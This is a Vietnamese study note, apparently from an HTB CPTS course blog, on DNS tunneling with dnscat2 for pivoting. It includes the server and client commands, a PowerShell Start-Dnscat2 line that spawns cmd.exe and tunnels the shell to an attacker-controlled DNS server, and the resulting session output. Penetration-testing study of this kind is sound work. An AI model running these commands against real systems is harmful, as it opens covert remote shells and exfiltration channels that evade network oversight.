---
title: "DNS Tunneling with Dnscat2"
date: 2026-04-24 22:44:02 +0700
categories: [HTB_CPTS, Pivot]
tags: [pivoting, tunneling, dns, dnscat2, c2]
description: "HTB CPTS note về DNS tunneling với dnscat2 trong internal pivoting."
pin: false
---
## Overview

**Dnscat2** là một tunneling tool sử dụng giao thức **DNS** để gửi dữ liệu giữa hai host.

Nó tạo một kênh **Command-and-Control** hay **C2/C&C channel** được mã hóa, sau đó nhúng dữ liệu vào **DNS TXT records**.

> **Ý chính**
> **Dnscat2 = encrypted C2 over DNS**
> Thay vì giao tiếp qua HTTP/HTTPS hoặc raw TCP reverse shell, attacker có thể dùng DNS request/response để truyền command và output.

---
## Why DNS Tunneling Works

Trong môi trường doanh nghiệp, đặc biệt là **Active Directory domain environment**, thường sẽ có DNS server nội bộ để phân giải hostname sang IP.

Normal DNS flow:

```text
Client -> Internal DNS Server -> External DNS Server
```
Với **dnscat2**, request phân giải DNS có thể được chuyển đến một server bên ngoài do attacker kiểm soát.

Compromised Host -> DNS Query -> Attacker-controlled DNS Server

> **Bản chất nguy hiểm**
> Khi local DNS server hoặc target cố resolve domain, dữ liệu có thể bị gửi ra ngoài thông qua DNS traffic thay vì chỉ là một DNS query hợp lệ.

---
## Attack Concept

Dnscat2 có thể được dùng để:

- Tạo encrypted C2 channel.
- Gửi command đến target.
- Nhận output từ target.
- Exfiltrate data qua DNS.
- Bypass một số firewall/inspection nếu DNS outbound không được kiểm soát tốt.

---
> **Ghi nhớ**
> Dnscat2 server dùng Ruby, nên cần `gem`, `bundler`, và Ruby dependencies.

---
## Start dnscat2 Server

```bash
sudo ruby dnscat2.rb --dns host=<ip_attacker>,port=53,domain=<domain> --no-cache
```

### Option Breakdown

| Option                 | Meaning                                  |
| ---------------------- | ---------------------------------------- |
| `sudo ruby dnscat2.rb` | Chạy dnscat2 server                      |
| `--dns`                | Chạy server ở DNS mode                   |
| `host=ip`              | IP attacker host lắng nghe               |
| `port=53`              | DNS port mặc định                        |
| `domain=<domain>       | Domain dùng cho tunnel                   |
| `--no-cache`           | Không cache DNS response khi lab/testing |

Sau khi chạy, server sẽ tạo một secret key:

--secret=secret_key


> **Secret Key**
> Secret key dùng để client xác thực với server và mã hóa session. Nếu dùng sai secret, session sẽ không được verify đúng.

---

## Client Connection Modes

Dnscat2 server sẽ gợi ý 2 cách client kết nối.

### 1. Kết nối qua domain

./dnscat --secret=secret_key inlanefreight.local

Dùng khi attacker có authoritative DNS server/domain đúng.

### 2. Kết nối trực tiếp đến DNS server IP

```
./dnscat --dns server=x.x.x.x,port=53 --secret=secret_key
```
Dùng khi muốn client kết nối trực tiếp đến attacker server qua UDP/53.

> **Trong HTB/lab**
> Cách direct-to-server thường dễ hiểu hơn vì client connect thẳng đến IP attacker trên UDP/53.

---
## Using dnscat2-powershell on Windows Target

Có thể dùng PowerShell client tương thích với dnscat2:

Sau đó transfer file `dnscat2.ps1` sang Windows target.

### Import module trên Windows

```bash
Import-Module .\dnscat2.ps1
```

Lệnh này load các cmdlet của dnscat2-powershell vào PowerShell session.

---
## Start DNS Tunnel from Windows Target

``` bash
Start-Dnscat2 -DNSserver <ip attacker> -Domain <domain> -PreSharedSecret secret_key_tu_attacker -Exec cmd
```

### Option Breakdown

| Option             | Meaning                                |
| ------------------ | -------------------------------------- |
| `Start-Dnscat2`    | Khởi tạo dnscat2 PowerShell client     |
| `-DNSserver <ip>   | IP attacker DNS server                 |
| `-Domain <ip>      | Domain dùng cho tunnel                 |
| `-PreSharedSecret` | Secret key lấy từ dnscat2 server       |
| `-Exec cmd`        | Spawn `cmd.exe` và gửi shell về server |

> **Điểm quan trọng**
> `-Exec cmd` tạo một CMD shell trên Windows target. Input/output của shell sẽ được tunnel qua DNS.

---
## Confirm Session

Nếu thành công, trên dnscat2 server sẽ thấy:

```bash
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
dnscat2>
```

Ý nghĩa:

|Output|Meaning|
|---|---|
|`New window created: 1`|Session mới được tạo|
|`ENCRYPTED AND VERIFIED`|Session đã mã hóa và xác thực|
|`dnscat2>`|Server đang sẵn sàng nhận command|

> **Security phụ thuộc vào secret**
> Độ an toàn của session phụ thuộc vào độ mạnh của pre-shared secret.

---
## Useful dnscat2 Commands

Tại prompt dnscat2, nhập:

```bash
?
```

Các command thường gặp:

| Command          | Purpose                                   |
| ---------------- | ----------------------------------------- |
| `help`           | Hiển thị trợ giúp                         |
| `windows`        | Liệt kê các windows/sessions              |
| `window -i <id>` | Tương tác với session cụ thể              |
| `kill`           | Kill session/window                       |
| `quit`           | Thoát dnscat2                             |
| `set` / `unset`  | Set hoặc unset options                    |
| `tunnels`        | Quản lý tunnels                           |
| `start` / `stop` | Start/stop feature hoặc session liên quan |

---
## Interact with Established Session

Để vào session số 1:

```bash
window -i 1
```

Sau đó có thể thấy console session:

```bash
Microsoft Windows [Version 10.0.18363.1801]
C:\Windows\system32>
```

Điều này nghĩa là attacker đã có interactive shell trên Windows target thông qua DNS tunnel.

Thoát khỏi session:

Ctrl + Z

---
## Why It Can Be Stealthy

Dnscat2 có thể stealthy vì DNS thường được allow outbound.

Một số firewall tập trung kiểm tra HTTPS traffic, nhưng lại ít kiểm soát sâu DNS traffic.

Firewall thấy: UDP/53 DNS traffic
Thực tế: C2 data đang được tunnel qua DNS

> **Tuy nhiên**
> Trong enterprise có egress filtering tốt, DNS tunneling rất dễ bị phát hiện qua metadata dù payload đã mã hóa.
